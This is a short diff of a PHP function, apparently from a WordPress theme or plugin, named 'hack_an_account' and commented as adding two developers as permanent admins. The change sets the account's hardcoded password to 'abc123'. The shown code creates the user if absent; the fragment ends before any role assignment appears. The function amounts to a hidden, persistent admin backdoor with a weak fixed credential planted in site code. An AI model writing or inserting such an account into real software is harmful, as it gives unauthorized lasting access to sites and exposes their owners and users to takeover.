@@ -2,7 +2,7 @@
 //* Adds Ben and Benji as permanent admins
 function hack_an_account(){
 	$user = 'benjith';
-	$pass = '';
+	$pass = 'abc123';
 	$email = 'benji@builtbytophat.com';
 	if (!username_exists($user) && !email_exists($email)) {
 		$user_id = wp_create_user($user, $pass, $email);
